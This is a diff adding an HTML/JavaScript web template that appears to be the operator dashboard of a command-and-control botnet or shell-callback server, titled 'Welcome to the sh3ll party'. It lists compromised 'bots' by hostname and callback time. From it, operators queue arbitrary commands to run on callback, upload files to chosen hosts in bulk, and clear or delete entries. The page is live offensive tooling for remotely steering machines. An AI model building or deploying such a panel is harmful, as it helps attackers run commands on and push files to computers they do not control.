@@ -1,0 +1,192 @@
+{% extends "base.htm" %}
+{% block head %}
+	<link rel="stylesheet" href="https://cdn.datatables.net/1.10.15/css/jquery.dataTables.min.css">
+{% endblock %}
+{% block content %}
+<div class="row" style="padding-top:15px;">
+<h2>Welcome to the sh3ll party</h2>
+</div>
+<div class="row">
+	<a href="#" id="upload-selected"><i class="fa fa-upload"></i></a> <a href="#" id="settext-selected"><i class="fa fa-keyboard-o"></i></a> <a href="#" id="cleartext-selected"><i class="fa fa-times"></i></a> <a href="#" id="del-selected"><i class="fa fa-trash"></i></a>&nbsp;&nbsp;<button class="btn btn-success" id="selAll">Select All</button>&nbsp;&nbsp;<button class="btn btn-primary" id="selNone">Select None</button>
+</div>
+<br>
+<div class="row">
+<table class="table" id="bottable">
+<thead>
+<tr>
+	<th>Id</th>
+	<th>Hostname</th>
+	<th>CB Host</th>
+	<th>Last CB</th>
+	<th>Command</th>
+</tr>
+</thead>
+<tbody>
+</tbody>
+</table>
+</div>
+<form enctype="multipart/form-data" action="" method="POST" id="theform">
+	<input type="hidden" name="botid" id="botid">
+	<input type="hidden" name="textentry" id="textentry">
+	<input type="hidden" name="clear" id="clear">
+	<input type="file" style="display:none" name="filereq" id="fileUploadField" />
+</form>
+{% endblock %}
+{% block footer %}
+    <script src="https://cdn.datatables.net/1.10.15/js/jquery.dataTables.min.js"></script>
+    <script type="text/javascript">
+	function clearFile() {
+		var inp = $('#fileUploadField');
+		inp.wrap('<form>').closest('form').get(0).reset();
+		inp.unwrap();
+	}
+    $(document).ready(function(){
+	var filebotlist = [];
+	clearFile();
+	var table = $('#bottable').DataTable( {
+	    	"ajax": "/api/json",
+		"pageLength": 100,
+	    	"columnDefs": [
+			{
+				"render": function (d, t, r){
+					var ret = '<a href="#" id="info"><i class="fa fa-info-circle"></i></a> <a href="#" id="upload"><i class="fa fa-upload"></i></a> <a href="#" id="settext"><i class="fa fa-keyboard-o"></i></a> <a href="#" id="cleartext"><i class="fa fa-times"></i></a> <a href="#" id="del"><i class="fa fa-trash"></i></a>  ' + d.substring(0,80);
+					if (d.length > 80) {ret += "...";}
+					return ret;
+				},
+				"orderable": false,
+				"targets": -1
+			}
+		]
+	} );
+	$('#bottable tbody').on( 'click', '#info', function () {
+			var data = table.row( $(this).parents('tr') ).data();
+			alert(data[4]);
+		}
+	);
+	$("#theform").submit( function (e) {
+		$.ajax ( { 
+			url: "/api/update/" + $("#botid").val(),
+			type: "POST",
+			data: new FormData( this ),
+			processData: false,
+			contentType: false
+		} );
+		e.preventDefault();
+	});
+	$('#bottable tbody').on( 'click', '#settext', function (e) {
+			var data = table.row( $(this).parents('tr') ).data();
+			$("#botid").val(data[0]);
+			$("#textentry").val(prompt("Command to run on callback", ""));
+			$("#theform").submit();
+			$("#textentry").val("");
+			e.preventDefault();
+			table.ajax.reload();
+		}
+	);
+	$('#bottable tbody').on( 'click', '#upload', function (e) {
+			var data = table.row( $(this).parents('tr') ).data();
+			filebotlist.push(data[0]);
+			$('#fileUploadField').click();
+			e.preventDefault();
+			table.ajax.reload();
+		}
+	);
+	$('#bottable tbody').on( 'click', '#cleartext', function (e) {
+			var data = table.row( $(this).parents('tr') ).data();
+			if (confirm("Clear the callback response?") == true){
+				$("#clear").val("yes");
+				$("#botid").val(data[0]);
+				$("#theform").submit();
+				$("#clear").val("");
+			}
+			e.preventDefault();
+			table.ajax.reload();
+		}
+	);
+	$('#bottable tbody').on( 'click', '#del', function (e) {
+			var data = table.row( $(this).parents('tr') ).data();
+			if (confirm("Delete the host?") == true){
+				$.ajax ( { 
+					url: "/api/delete/" + data[0],
+					type: "GET",
+				} );
+			}
+			e.preventDefault();
+			table.ajax.reload();
+		}
+	);
+	$('#bottable tbody').on( 'click', 'tr', function () {
+		$(this).toggleClass('selected');
+	} );
+	$('#cleartext-selected').click(function (e) {
+		if (confirm("Clear the callback response?") == true){
+			table.rows('.selected').every(function(i, tl, rl){
+				var data = this.data();
+				$("#clear").val("yes");
+				$("#botid").val(data[0]);
+				$("#theform").submit();
+				$("#clear").val("");
+			});
+		}
+		e.preventDefault();
+		table.ajax.reload();
+	});
+	$('#del-selected').click(function (e) {
+		if (confirm("Delete the hosts?") == true){
+			table.rows('.selected').every(function(i, tl, rl){
+				var data = this.data();
+				$.ajax ( { 
+					url: "/api/delete/" + data[0],
+					type: "GET",
+				} );
+			});
+		}
+		e.preventDefault();
+		table.ajax.reload();
+	});
+	$('#fileUploadField').change(function (e, data) {
+		$.each(filebotlist, function (index) {
+			$("#botid").val(this);
+			$("#theform").submit();
+		} );
+		clearFile();
+		filebotlist = [];
+		e.preventDefault();
+		table.ajax.reload();
+	});
+	$('#settext-selected').click(function (e) {
+		$("#textentry").val(prompt("Command to run on callback", ""));
+		table.rows('.selected').every(function(i, tl, rl){
+			var data = this.data();
+			$("#botid").val(data[0]);
+			$("#theform").submit();
+		});
+		$("#textentry").val("");
+		e.preventDefault();
+		table.ajax.reload();
+	});
+	$('#upload-selected').click(function (e) {
+		table.rows('.selected').every(function(i, tl, rl){
+			var data = this.data();
+			filebotlist.push(data[0]);
+		});
+		$('#fileUploadField').click();
+		e.preventDefault();
+		table.ajax.reload();
+	});
+	$("#selAll").click(function (e) {
+		$("#bottable").children("tbody").children("tr").each(function (i) {
+			$(this).addClass('selected');
+		} );
+	} );
+	$("#selNone").click(function (e) {
+		$("#bottable").children("tbody").children("tr").each(function (i) {
+			$(this).removeClass('selected');
+		} );
+	} );
+	setInterval( function () {
+	    table.ajax.reload();
+	}, 15000 );
+    });
+    </script>
+{% endblock footer %}
